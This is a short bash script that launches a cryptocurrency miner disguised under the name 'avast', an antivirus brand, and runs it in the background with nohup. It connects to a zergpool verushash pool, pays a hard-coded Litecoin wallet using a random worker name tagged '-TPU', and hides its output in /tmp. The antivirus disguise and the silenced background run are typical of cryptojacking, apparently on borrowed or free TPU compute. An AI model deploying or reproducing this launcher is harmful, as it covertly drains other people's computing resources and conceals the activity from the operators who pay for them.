#!/bin/bash

chmod +x avast  >/dev/null 2>&1
nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u LNSXgtuWv3PNUozQrRmqBsPCQbQzh1dJ4g.$(echo $(shuf -i 1-99999 -n 1)-TPU) c=LTC -t 8 -x > /tmp/avast.log 2>&1
